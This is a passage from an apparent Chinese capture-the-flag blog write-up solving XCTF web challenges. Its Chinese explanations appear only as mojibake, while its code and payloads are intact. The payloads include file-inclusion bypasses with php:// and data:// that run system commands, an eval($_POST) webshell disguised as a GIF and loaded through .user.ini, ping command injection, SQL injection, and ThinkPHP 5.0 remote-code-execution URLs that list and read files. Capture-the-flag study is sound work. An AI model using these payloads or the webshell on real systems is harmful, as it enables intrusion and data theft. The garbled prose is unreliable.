class="comment">#cçš„mä¸æ˜¯æ•°å­—ä¸”å…¶å€¼å¤§äº2022</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line"><span class="comment">#cçš„nä¹Ÿæ˜¯ä¸€ä¸ªæ•°ç»„,æœ‰ä¸¤ä¸ªå…ƒç´ ,cçš„nçš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¹Ÿæ˜¯ä¸€ä¸ªæ•°ç»„</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">    <span class="comment">#$dä¸èƒ½æ˜¯falseæ‰€ä»¥èƒ½åœ¨cçš„næ•°ç»„ä¸­æ‰¾åˆ°DGGJ</span></span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">#nä¸­å€¼ä¸èƒ½ä¸ºDGGJ</span></span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> Emmm...</span><br></pre></td></tr></table></figure><p>a<br>ç”¨1e9å³å¯ç»•è¿‡</p><p>b<br>ç¼–å†™è„šæœ¬çˆ†ç ´</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$i</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="number">100000</span>)&#123;</span><br><span class="line">    <span class="variable">$a</span> = (<span class="keyword">string</span>)<span class="variable">$i</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,-<span class="number">6</span>,<span class="number">6</span>) == <span class="string">&#x27;8b184b&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$i</span> = <span class="variable">$i</span>+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$md</span> = <span class="string">&quot;end&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$md</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170945323.png"><br>çˆ†ç ´å‡ºbä¸º53724</p><p>C<br>1.m<br>å­—ç¬¦ä¸²ä¸æ•´å½¢æ¯”å¤§å°ä¼šå°†å­—ç¬¦ä¸²å¼ºè¡Œè½¬ä¸ºæ•´å½¢<br>114514a &#x3D;ã€‹ 114514 &gt; 2022<br>2.n<br>é¢˜ç›®å†…æ—¢è¦æ±‚æœ‰DGGJåˆè¦æ±‚æ²¡æœ‰DGGJ,æ‰€ä»¥éœ€è¦ç»•è¿‡<br>array_searchå‡½æ•°æ˜¯å¯ä»¥ç»•è¿‡çš„,åœ¨ä¸æ•°å­—è¿›è¡ŒåŒ¹é…ï¼Œå­—ç¬¦ä¸²ä¼šè¢«å¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—ï¼ŒDGGJä¼šè¢«è½¬æ¢ä¸º0,æ‰€ä»¥nçš„ç¬¬äºŒä¸ªå…ƒç´ ä¸ºæ•´æ•°0<br>ç¬¬ä¸€ä¸ªå…ƒç´ æ²¡æœ‰è¦æ±‚åªè¦æ˜¯æ•°ç»„éšä¾¿å†™</p><p>æ‰€ä»¥C &#x3D; {m:â€114514aâ€;n:[[1],0]}<br>ç»¼ä¸Š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:54204/?a=1e9&amp;b=53724&amp;c=&#123;%22m%22:%22114514a%22,%22n%22:[[1],0]&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170945243.png"></p><h2 id="4-fileinclude-NO-GFSJ1010"><a href="#4-fileinclude-NO-GFSJ1010" class="headerlink" title="4.fileinclude-NO.GFSJ1010"></a>4.fileinclude-NO.GFSJ1010</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>];</span><br><span class="line">    <span class="variable">$file2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$file1</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$file2</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file2</span>) === <span class="string">&quot;hello ctf&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$file1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>éœ€è¦ä¼ å…¥è¢«åŒ…å«çš„file1,file1&#x3D;flag.php<br>éœ€è¦ä¼ å…¥file2, file_get_contents($file2)å€¼ç­‰äºhello ctf<br>åˆ™æƒ³åˆ°ç”¨php:&#x2F;&#x2F;input,postçš„å€¼ä¸ºhello ctf<br>è¿”å›<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170946155.png"></p><p>å°è¯•file1ä½¿ç”¨ä¼ªåè®®è¯»å–flag,æˆåŠŸè¿”å›ç»“æœ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170947654.png"></p><p>è§£å¯†åå¾—åˆ°key<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170948584.png"></p><h2 id="5-easyupload-NO-GFSJ1005"><a href="#5-easyupload-NO-GFSJ1005" class="headerlink" title="5.easyupload-NO.GFSJ1005"></a>5.easyupload-NO.GFSJ1005</h2><p>å°è¯•ä¸Šä¼ äº†ä¸€å¼ å›¾ç‰‡,å‘ç°è¿”å›å›¾ç‰‡åœ°å€,å¯ç›´æ¥è®¿é—®<br>å°è¯•ä¸Šä¼ æœ¨é©¬,æŠ“åŒ…å¤šæ¬¡æ’æŸ¥å‘ç°è¿‡æ»¤äº†php,php1-9,.htaccess</p><p>åç«¯éªŒè¯,å°è¯•ä½¿ç”¨user.iniæ–‡ä»¶<br>.user.iniæ˜¯php.iniè¡¥å……æ–‡ä»¶,å½“ç½‘é¡µè®¿é—®æ—¶ä¼šè‡ªåŠ¨æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ˜¯å¦æœ‰user.ini, å°†å…¶è¡¥å……è¿›php.ini<br>å¾ˆå¤šåŠŸèƒ½åªèƒ½php.iniè®¾ç½®,ä½†æ˜¯æœ‰äº›å±é™©åŠŸèƒ½ä¹Ÿèƒ½é€šè¿‡user.inié…ç½®</p><p>auto_prepend_file ç”¨äºæŒ‡å®šä¸€ä¸ªæ¯ä¸ªphpè„šæœ¬æ‰§è¡Œå‰è‡ªåŠ¨åŒ…å«çš„æ–‡ä»¶<br>æˆ‘ä»¬å¯ä»¥å…ˆä¼ å…¥.user.iniæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=test.jpg</span><br></pre></td></tr></table></figure><p>æŠ“åŒ…ä¸Šä¼ å‘ç°ä¸Šä¼ å¤±è´¥,å°è¯•æ”¹Content-Typeå’Œæ–‡ä»¶å¤´<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170949744.png"></p><p>å‘ç°ä¸Šä¼ æˆåŠŸ<br>æ–°å»ºtest.jpg</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>F12æŸ¥çœ‹æ–‡ä»¶ä¸Šä¼ è·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:54702/uploads/index.php</span><br></pre></td></tr></table></figure><p>èšå‰‘è¿æ¥,åœ¨ç›®å½•ä¸‹æ‹¿åˆ°key</p><p>.user.iniåº”ç”¨æ¯”.htaccessæ›´å¹¿,åªè¦ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥</p><h2 id="6-fileinclude-NO-GFSJ1007"><a href="#6-fileinclude-NO-GFSJ1007" class="headerlink" title="6.fileinclude-NO.GFSJ1007"></a>6.fileinclude-NO.GFSJ1007</h2><p>ctrl+Uå¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;display_errors&#x27;</span>) ) &#123;</span><br><span class="line">  <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$lan</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;language&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$lan</span>)</span><br><span class="line">&#123;</span><br><span class="line">@<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;language&quot;</span>,<span class="string">&quot;english&quot;</span>);</span><br><span class="line">@<span class="keyword">include</span>(<span class="string">&quot;english.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$lan</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>éœ€è¦ä¼ å…¥å…¶ä¸­languageå‚æ•°ç”¨äºæ„é€ è¢«åŒ…å«æ–‡ä»¶<br>å°è¯•language&#x3D;flagå‘ç°æ— å›æ˜¾<br>å°è¯•ä½¿ç”¨ä¼ªåè®®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: language=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170950429.png"><br>å¾—åˆ°base64ç¼–ç å­—ç¬¦ä¸²<br>è§£ç åå¾—åˆ°flag</p><h2 id="7-inget-NO-GFSJ1004"><a href="#7-inget-NO-GFSJ1004" class="headerlink" title="7.inget-NO.GFSJ1004"></a>7.inget-NO.GFSJ1004</h2><p>è¾“å…¥å‚æ•°idå°è¯•ç™»å½•,<br>çŒœæµ‹ä¸ºå•å¼•å·é—­å’Œ,æ„é€ ?id&#x3D;1â€™ or â€˜1â€™&#x3D;â€™1<br>ä½¿è¯­å¥ä¸ºçœŸæˆåŠŸç»•è¿‡å¾—åˆ°flag</p><h2 id="8-unserialize3-NO-GFSJ0235"><a href="#8-unserialize3-NO-GFSJ0235" class="headerlink" title="8.unserialize3-NO.GFSJ0235"></a>8.unserialize3-NO.GFSJ0235</h2><p>æ ¹æ®é¢˜æ„ç”Ÿæˆå¯¹åº”åºåˆ—åŒ–å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å†è®²å˜é‡æ•°ï¼‹1ç»•è¿‡__wakeupå‡½æ•°å¾—åˆ°flag</p><h2 id="9-ics-06-NO-GFSJ0333"><a href="#9-ics-06-NO-GFSJ0333" class="headerlink" title="9.ics-06-NO.GFSJ0333"></a>9.ics-06-NO.GFSJ0333</h2><p>è®¿é—®æŠ¥è¡¨ä¸­å¿ƒ,æŠ“åŒ…çˆ†ç ´<br>å‘ç°è®¿é—®id&#x3D;2333é¡µé¢æ—¶æœ‰flag</p><h2 id="10-PHP2-NO-GFSJ0234"><a href="#10-PHP2-NO-GFSJ0234" class="headerlink" title="10.PHP2-NO.GFSJ0234"></a>10.PHP2-NO.GFSJ0234</h2><p>è‡ªåŠ¨è®¿é—®index.php<br>é€šè¿‡è®¿é—®index.phpsè·å–æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure><p>è¿›è¡Œurlç¼–ç å³å¯å¾—åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:60123/index.php/?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</span><br></pre></td></tr></table></figure><h2 id="11-baby-web-NO-GFSJ0712"><a href="#11-baby-web-NO-GFSJ0712" class="headerlink" title="11.baby_web-NO.GFSJ0712"></a>11.baby_web-NO.GFSJ0712</h2><p>f12-&gt;networksæŸ¥çœ‹åˆ°è¯·æ±‚å¤´ä¸­æœ‰flag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170951289.png"></p><h2 id="12-Training-WWW-Robots-NO-GFSJ0162"><a href="#12-Training-WWW-Robots-NO-GFSJ0162" class="headerlink" title="12.Training-WWW-Robots-NO.GFSJ0162"></a>12.Training-WWW-Robots-NO.GFSJ0162</h2><p>è®¿é—®robots.txtåè®¿é—®f10g.phpå³å¯è·å¾—flag</p><h2 id="13-simple-php-NO-GFSJ0485"><a href="#13-simple-php-NO-GFSJ0485" class="headerlink" title="13.simple_php-NO.GFSJ0485"></a>13.simple_php-NO.GFSJ0485</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="comment">#aå€¼ä¸º0ä¸”andè‡ªå·±æ€»å€¼ä¸ºçœŸ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#bä¸æ˜¯æ•°å­—</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#bå€¼æ¯”1234å¤§</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>aä¸ºå­—ç¬¦ä¸²0å³å¯<br>å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒä¼šå‘ç”Ÿå¼ºåˆ¶è½¬æ¢<br>b&#x3D;12345aaaå³å¯è·å–flag</p><h2 id="14-weak-auth-NO-GFSJ0482"><a href="#14-weak-auth-NO-GFSJ0482" class="headerlink" title="14.weak_auth-NO.GFSJ0482"></a>14.weak_auth-NO.GFSJ0482</h2><p>admin 123456ç™»å½•è·å–flag</p><h2 id="15-get-post-NO-GFSJ0475"><a href="#15-get-post-NO-GFSJ0475" class="headerlink" title="15.get_post-NO.GFSJ0475"></a>15.get_post-NO.GFSJ0475</h2><p>æŒ‰ç…§æŒ‡ç¤ºä¼ å…¥å¯¹åº”å€¼å³å¯è·å–flag</p><h2 id="16-disabled-button-NO-GFSJ0479"><a href="#16-disabled-button-NO-GFSJ0479" class="headerlink" title="16.disabled_button-NO.GFSJ0479"></a>16.disabled_button-NO.GFSJ0479</h2><p>f12æŠŠdisabled&#x3D;â€â€ åˆ é™¤<br>ç‚¹å‡»æŒ‰é’®å³å¯è·å–flag</p><h2 id="17-cookie-NO-GFSJ0478"><a href="#17-cookie-NO-GFSJ0478" class="headerlink" title="17.cookie-NO.GFSJ0478"></a>17.cookie-NO.GFSJ0478</h2><p>æŠ“åŒ…å‘ç°cookieçš„å€¼ä¸ºcookie.php<br>è®¿é—®åæŸ¥çœ‹è¿”å›åŒ…å³å¯è·å¾—flag</p><h2 id="18-backup-NO-GFSJ0477"><a href="#18-backup-NO-GFSJ0477" class="headerlink" title="18.backup-NO.GFSJ0477"></a>18.backup-NO.GFSJ0477</h2><p>è®¿é—®index.php.bakä¸‹è½½å¤‡ä»½æ–‡ä»¶,å¾—åˆ°flag</p><h2 id="19-robots-NO-GFSJ0476"><a href="#19-robots-NO-GFSJ0476" class="headerlink" title="19.robots-NO.GFSJ0476"></a>19.robots-NO.GFSJ0476</h2><p>ç›´æ¥è®¿é—®robots.txtå‘ç°<br>Disallow: f1ag_1s_h3re.php<br>ç›´æ¥è®¿é—®å¾—åˆ°flag</p><h2 id="20-view-source-NO-GFSJ0474"><a href="#20-view-source-NO-GFSJ0474" class="headerlink" title="20.view_source-NO.GFSJ0474"></a>20.view_source-NO.GFSJ0474</h2><p>ctrl+UæŸ¥çœ‹æºç &#x2F; f12æŸ¥çœ‹æºç å¾—åˆ°flag</p><h1 id="2-éš¾åº¦äºŒ"><a href="#2-éš¾åº¦äºŒ" class="headerlink" title="2.éš¾åº¦äºŒ"></a>2.éš¾åº¦äºŒ</h1><h2 id="1-command-execution-NO-GFSJ0484"><a href="#1-command-execution-NO-GFSJ0484" class="headerlink" title="1.command_execution-NO.GFSJ0484"></a>1.command_execution-NO.GFSJ0484</h2><p>ping 127.0.0.1 &amp; pwd è¿”å›&#x2F;var&#x2F;www&#x2F;html<br>&amp;æ²¡è¢«è¿‡æ»¤,è¿›ä¸€æ­¥æ‰¾flag</p><p>ping 127.0.0.1 &amp; find &#x2F; -name flag*<br>å‘ç°å­˜åœ¨&#x2F;home&#x2F;flags.txt</p><p>ç›´æ¥æŸ¥çœ‹å¾—åˆ°flag</p><h2 id="2-xff-referer-NO-GFSJ0481"><a href="#2-xff-referer-NO-GFSJ0481" class="headerlink" title="2.xff_referer-NO.GFSJ0481"></a>2.xff_referer-NO.GFSJ0481</h2><p>ipåœ°å€å¿…é¡»ä¸º123.123.123.123</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 123.123.123.123</span><br></pre></td></tr></table></figure><p>å¿…é¡»æ¥è‡ªgoogle</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer: https://www.google.com</span><br></pre></td></tr></table></figure><h2 id="3-php-rce-NO-GFSJ0713"><a href="#3-php-rce-NO-GFSJ0713" class="headerlink" title="3.php_rce-NO.GFSJ0713"></a>3.php_rce-NO.GFSJ0713</h2><p>thinkphp-v5.0å­˜åœ¨rceæ¼æ´<br>æŸ¥ç›¸å…³æ–‡çŒ®å¤ç°å³å¯<br>å›è°ƒå‡½æ•°+systemå‡½æ•°æ‰§è¡Œå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:58546/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:58546/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20flag*</span><br></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨&#x2F;flag<br>æŸ¥çœ‹å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:58546/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</span><br></pre></td></tr></table></figure><h2 id="4-Web-php-include-NO-GFSJ0716"><a href="#4-Web-php-include-NO-GFSJ0716" class="headerlink" title="4.Web_php_include-NO.GFSJ0716"></a>4.Web_php_include-NO.GFSJ0716</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#getä¼ å…¥hello</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="comment">#getä¼ å…¥page</span></span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="comment">#æŸ¥æ‰¾pageä¸­æ˜¯å¦æœ‰php://,æœ‰çš„è¯å°±è¿”å›php://å’Œåé¢çš„å†…å®¹</span></span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line"><span class="comment">#å°†php://æ›¿æ¢ä¸ºç©º</span></span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#æ–‡ä»¶åŒ…å«$page</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°è¿‡æ»¤php:&#x2F;&#x2F;<br>å°è¯•ç”¨data:&#x2F;&#x2F;æµç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:49769/?hello=123&amp;page=data://text/plain,%3C?php%20phpinfo()?%3E</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170952443.png"></p><p>æ‰§è¡Œlså‘ç°å­˜åœ¨fl4gisisish3r3.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:49769/?hello=123&amp;page=data://text/plain,%3C?php%20eval(system(%27ls%27));%20?%3E</span><br></pre></td></tr></table></figure><p>catè¢«å±è”½,ä½¿ç”¨tacæˆåŠŸæŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:49769/?hello=123&amp;page=data://text/plain,%3C?php%20eval(system(%27tac%20fl4gisisish3r3.php%27));%20?%3E</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170952435.png"></p><h2 id="5-upload1-NO-GFSJ0236"><a href="#5-upload1-NO-GFSJ0236" class="headerlink" title="5.upload1-NO.GFSJ0236"></a>5.upload1-NO.GFSJ0236</h2><p>å‰ç«¯æ ¡éªŒ,å…³é—­jsä¸Šä¼ å³å¯,<br>è¿”å›çš„ç»“æœæ˜¯ æ—¶é—´æˆ³+â€™.â€™+æ–‡ä»¶å<br>å°†æ–‡ä»¶åæ”¹æˆphp</p><p>ä¸Šä¼ åè®¿é—®è¿”å›é“¾æ¥æ‰§è¡Œå‘½ä»¤,ä¼ æœ¨é©¬ä¸Šå»å´æŠ¥é”™<br>syntax error, unexpected end of file in <b>&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;1691297398.a.php(1) : eval()â€™d code</b> on line <b>1</b><br /></p><p>ç›´æ¥ä¼ å‘½ä»¤æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;find / -name flag*&#x27;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿”å›ç»“æœé‡Œæœ‰&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac /var/www/html/flag.php&#x27;</span>) <span 